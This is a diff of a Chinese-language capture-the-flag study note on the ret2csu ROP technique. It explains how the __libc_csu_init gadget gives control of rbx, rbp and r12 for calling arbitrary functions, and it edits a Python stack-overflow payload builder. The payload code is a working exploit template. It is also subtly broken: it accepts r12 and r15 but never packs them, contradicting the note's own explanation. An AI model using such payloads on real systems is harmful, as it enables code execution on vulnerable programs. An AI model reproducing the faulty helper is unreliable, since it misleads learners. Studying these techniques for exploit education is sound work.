@@ -86,12 +86,11 @@ https://github.com/zhengmin1989/ROP_STEP_BY_STEP/raw/master/linux_x64/level5
 rdx = r15,rsi=r14,edi=r13d
 rdi的低位=edi，所以同样能起到控制rdi的作用。
 同时控制r12还能搞函数调用
+
 ```
-.text:00000000004005FD                 add     rbx, 1
-.text:0000000000400601                 cmp     rbx, rbp
-.text:0000000000400604                 jnz     short loc_4005F0
+call    qword ptr [r12+rbx*8]
 ```
-只要控制rbx为0，rbp为1就行了
+只要控制rbx为0，rbp为1,r12为要call的函数就可以。
 例题：
 ==
 ```C
@@ -107,13 +106,13 @@ def csu
 --
 直接构造payload就行，这里方便理解把栈图画出来
 ```python
-def csu(rbx,rbp,r12,r13,r14,r15):
+def csu(rbx,rbp,r12,r13,r14,r15,ret):
     payload = padding + p64(csu_end)
     payload += p64(0)
     payload += p64(rbx)+p64(rbp)+p64(r13)+p64(r14)
     payload += p64(csu_start)
     payload += "a"*(6*8+8)
-    payload += p64(main)
+    payload += p64(ret)
     s.sendline(payload)
 ```
 在调用过libc_csu_init之后我们还需要把main函数覆盖到ret上，前面padding7*8个字节(6个寄存器+一个rbp)
